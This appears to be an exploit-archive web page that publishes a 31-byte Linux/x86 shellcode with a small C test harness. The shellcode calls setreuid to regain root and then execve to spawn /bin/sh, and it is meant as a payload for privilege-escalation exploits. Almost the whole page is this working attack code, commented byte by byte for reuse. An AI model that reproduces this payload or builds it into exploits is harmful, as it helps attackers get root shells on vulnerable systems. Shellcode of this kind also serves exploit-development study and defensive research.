<html><head><title>Linux/x86 - setreuid &amp; execve - 31 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/* 31 byte setreuid() shellcode - # man shadow
* os: Slackware 9.1, Phlak 2.4, Knoppix 0.1
*
* www.manshadow.org
* r-22@manshadow.org
* irc.efnet.net #_man_shadow
*/

char shellcode[] =
&quot;\x31\xC9&quot;              /* xor ecx,ecx     */
&quot;\x31\xDB&quot;              /* xor ebx,ebx     */
&quot;\x6A\x46&quot;              /* push byte 70    */
&quot;\x58&quot;                  /* pop eax         */
&quot;\xCD\x80&quot;              /* int 80h         */
&quot;\x51&quot;                  /* push ecx        */
&quot;\x68\x2F\x2F\x73\x68&quot;  /* push 0x68732F2F */
&quot;\x68\x2F\x62\x69\x6E&quot;  /* push 0x6E69622F */
&quot;\x89\xE3&quot;              /* mov ebx,esp     */
&quot;\x51&quot;                  /* push ecx        */
&quot;\x53&quot;                  /* push ebx        */
&quot;\x89\xE1&quot;              /* mov ecx,esp     */
&quot;\x99&quot;                  /* cdq             */
&quot;\xB0\x0B&quot;              /* mov al,11       */
&quot;\xCD\x80&quot;;             /* int 80h         */

int main(int argc, char *argv[]) {
       void (*sc)() = (void *)shellcode;
       printf(&quot;len:%d\n&quot;, strlen(shellcode));
       sc();
       return 0;
}



<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
